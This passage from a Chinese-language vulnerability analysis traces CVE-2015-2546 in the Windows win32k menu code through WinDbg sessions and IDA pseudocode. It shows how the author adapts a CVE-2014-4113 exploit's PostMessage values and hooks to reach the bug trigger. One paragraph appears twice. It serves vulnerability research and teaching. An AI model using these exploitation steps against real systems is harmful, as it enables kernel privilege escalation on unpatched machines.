           WM_RBUTTONUP = 0x205,   //Right mousebutton up
           WM_RBUTTONDBLCLK = 0x206, //Right mousebutton doubleclick
           WM_KEYDOWN = 0x100,  //Key down
           WM_KEYUP = 0x101,   //Key up
       }
原来这个值就是WM_LBUTTONDOWN的值，正是CVE-2014-4113利用程序中MyWndProc中其中第三个PostMessage中调用到的第二个参数值，所以，我在这里，将我的Exploit中的PostMessage里第二个参数直接修改成0x200，重新运行程序，终于命中了MNMouseMove断点。接下来可以进入内层函数分析了。
原来这个值就是WM_LBUTTONDOWN的值，正是CVE-2014-4113利用程序中MyWndProc中其中第三个PostMessage中调用到的第二个参数值，所以，我在这里，将我的Exploit中的PostMessage里第二个参数直接修改成0x200，重新运行程序，终于命中了MNMouseMove断点。接下来可以进入内层函数分析了。
    kd> p
    win32k!xxxMNMouseMove+0x2f:
    9066941e 0f846f010000    je      win32k!xxxMNMouseMove+0x1a4 (90669593)
    kd> p
    win32k!xxxMNMouseMove+0x1a4:
    90669593 5f              pop     edi
来看一下IDA pro的伪代码。
    if ( (signed __int16)a3 != *(_DWORD *)(a2 + 8) || SHIWORD(a3) != *(_DWORD *)(a2 + 12) )
        {
只有上面伪代码中的if语句判断通过后，才能进入到漏洞的处理流程，动态跟踪一下这个过程。
    kd> p
    win32k!xxxMNMouseMove+0x26:
    90669415 c1ea10          shr     edx,10h
    kd> r edx
    edx=00000000
    kd> p
    win32k!xxxMNMouseMove+0x29:
    90669418 0fbfd2          movsx   edx,dx
    kd> r edx
    edx=00000000
    kd> p
    win32k!xxxMNMouseMove+0x2c:
    9066941b 3b570c          cmp     edx,dword ptr [edi+0Ch]
这最主要的原因就是对比的两个值都为0，从而不满足if语句的跳转，跳过了漏洞处理所需的逻辑流程，但是在我们利用鼠标移动的时候，却发现这个流程可以进入if语句判断。
    kd> p
    win32k!xxxHandleMenuMessages+0x2e8:
    90669061 e889030000      call    win32k!xxxMNMouseMove (906693ef)
    kd> dd esp
    85c47a98  fde8da68 9074f580 000f0059 9074f580 //000f0059
    kd> p
    win32k!xxxMNMouseMove+0x18:
    90669407 0fbfc1          movsx   eax,cx
    kd> r ecx
    ecx=000f0059
    kd> p
    win32k!xxxMNMouseMove+0x1b:
    9066940a 57              push    edi
    kd> p
    win32k!xxxMNMouseMove+0x1c:
    9066940b 8b7d0c          mov     edi,dword ptr [ebp+0Ch]
    kd> p
    win32k!xxxMNMouseMove+0x1f:
    9066940e 3b4708          cmp     eax,dword ptr [edi+8]
    kd> p
    win32k!xxxMNMouseMove+0x22:
    90669411 7511            jne     win32k!xxxMNMouseMove+0x35 (90669424)
    kd> p
    win32k!xxxMNMouseMove+0x35:
    90669424 894708          mov     dword ptr [edi+8],eax
    kd> r eax
    eax=00000059
鼠标移动的情况下，eax的值是0x59，并非0x00，那么这个值从哪里来呢，在进入MNMouseMove前看一下参数。
    kd> p
    win32k!xxxHandleMenuMessages+0x2e8:
    90669061 e889030000      call    win32k!xxxMNMouseMove (906693ef)
    kd> dd esp
    85c47a98  fde8da68 9074f580 000f0059 9074f580
通过IDA pro分析一下HandleMenuMessages函数，看看这个值是从哪里来。
    v5 = *(_DWORD *)(a1 + 4);
    v6 = *(_DWORD *)(a1 + 8);
    v7 = *(void **)(a1 + 12);
    xxxMNMouseMove(v3, a2, (int)v7);
是a1，也就是HandleMenuMessages的第一个参数，这样我们可以回到CVE-2014-4113中，在调用HandleMenuMessages的时候，直接查看第一个参数偏移+0Ch位置的值，看看这个值是不是由我们决定的。
    kd> p
    win32k!xxxHandleMenuMessages+0x1e:
    90668d96 8b4604          mov     eax,dword ptr [esi+4]
    kd> p
    win32k!xxxHandleMenuMessages+0x21:
    90668d99 8b5608          mov     edx,dword ptr [esi+8]
    kd> p
    win32k!xxxHandleMenuMessages+0x24:
    90668d9c 8b5e0c          mov     ebx,dword ptr [esi+0Ch]
    kd> r edx
    edx=00000000
    kd> p
    win32k!xxxHandleMenuMessages+0x27:
    90668d9f b904010000      mov     ecx,104h
    kd> r ebx
    ebx=00000000
    kd> r eax
    eax=00000201
可以看到ebx寄存器是esi+0ch的值，这个值是0，eax的值是0x201，回过头看一下正常Exploit中MyWndProc函数的PostMessages的参数调用。
    PostMessage(hwnd,WM_LBUTTONDOWN,0x00,0)
这个第三个第四个特定参数都是0x00，那么我觉得这个可能和MNMouseMove中的值有关，于是我尝试修改了CVE-2015-2546中PostMessage消息传递的特定参数。
修改之后，我们重新跟踪调试。
    kd> p
    win32k!xxxHandleMenuMessages+0x21:
    90668d99 8b5608          mov     edx,dword ptr [esi+8]
    kd> p
    win32k!xxxHandleMenuMessages+0x24:
    90668d9c 8b5e0c          mov     ebx,dword ptr [esi+0Ch]
    kd> p
    win32k!xxxHandleMenuMessages+0x27:
    90668d9f b904010000      mov     ecx,104h
    kd> r edx
    edx=00110011
    kd> r ebx
    ebx=00110011
果然这个值可控了，而且esi指针的值就+4h是PostMessage第二个参数，+08h是第三个参数，+0Ch是第四个参数，接下来，MNMouseMove也能够正常进入if语句的处理流程了。
    kd> p
    win32k!xxxHandleMenuMessages+0x2e8:
    90669061 e889030000      call    win32k!xxxMNMouseMove (906693ef)
    kd> dd esp
    85d07a98  fde8da68 9074f580 00110011 9074f580
    kd> p
    win32k!xxxMNMouseMove+0x1f:
    9066940e 3b4708          cmp     eax,dword ptr [edi+8]
    kd> p
    win32k!xxxMNMouseMove+0x22:
    90669411 7511            jne     win32k!xxxMNMouseMove+0x35 (90669424)
    kd> r eax
    eax=00000011
    kd> p
    win32k!xxxMNMouseMove+0x35:
    90669424 894708          mov     dword ptr [edi+8],eax
### 在HOOK中挣扎和Exploit
接下来，进入到消息钩子部分，主要处理的还是SendMessage异步处理时的消息，通过修改返回，最后达到漏洞调用位置，通过IDA
pro来跟踪一下MNMouseMove的执行流程，以及跟CVE-2015-2546有关的部分。
    void __stdcall xxxMNMouseMove(WCHAR UnicodeString, int a2, int a3)
    {
      ……
        if ( (signed __int16)a3 != *(_DWORD *)(a2 + 8) || SHIWORD(a3) != *(_DWORD *)(a2 + 12) )
        {
          *(_DWORD *)(a2 + 8) = (signed __int16)a3;
          *(_DWORD *)(v5 + 12) = SHIWORD(v4);
          v6 = xxxMNFindWindowFromPoint(v3, (int)&UnicodeString, v4);// V6通过HOOK可控，这里的sendmessage是异步处理
          v7 = v6;                                  // v7可控
          ……
          if ( *(_DWORD *)(v5 + 16) == 1 )          // 这个外层if不一定会进来
          {
            if ( !v7 || v7 == -1 && *(_BYTE *)(*(_DWORD *)(v3 + 4) + 35) & 0x20 )// 判断返回值是0或者-1
              return;
            *(_DWORD *)(v5 + 16) = -1;
          }
          if ( v7 == -5 )                           // 当返回值是0xffffffb
          {
    ……
          }
          else                                      // 否则进入这里
          {
             ……
              v9 = *(_DWORD **)(v7 + 176);          // 获取tagPOPUPMENU的位置，偏移是+0B0h
             ……
              v10 = xxxSendMessage((PVOID)v7, -27, UnicodeString, 0);
              if ( v10 & 0x10 && !(v10 & 3) && !xxxSendMessage((PVOID)v7, -16, 0, 0) )
                xxxMNHideNextHierarchy(v9);         // 漏洞触发关键位置
经过分析，我们需要处理三处SendMessage的异步过程，第一处在FindWindowFromPoint，这个函数中会有一处SendMessage，通过异步过程执行钩子，但是我调试时发现在进入这个函数返回，但并没有执行钩子。
    kd> p
    win32k!xxxMNMouseMove+0x48:
    90669437 e862010000      call    win32k!xxxMNFindWindowFromPoint (9066959e)
    kd> p
    win32k!xxxMNMouseMove+0x4d:
    9066943c f7470400800000  test    dword ptr [edi+4],8000h
    kd> r eax
    eax=fea11430
    跟踪一下这个过程，我发现在进入SendMessage之前，有一处if语句判断，当这个if语句判断不通过的时候，不会进入SendMessage处理。
    kd> p
    win32k!xxxMNFindWindowFromPoint+0x14:
    906695b2 8b470c          mov     eax,dword ptr [edi+0Ch]
    kd> p
    win32k!xxxMNFindWindowFromPoint+0x17:
    906695b5 85c0            test    eax,eax
    kd> p
    win32k!xxxMNFindWindowFromPoint+0x19:
    906695b7 746b            je      win32k!xxxMNFindWindowFromPoint+0x86 (90669624)
    kd> p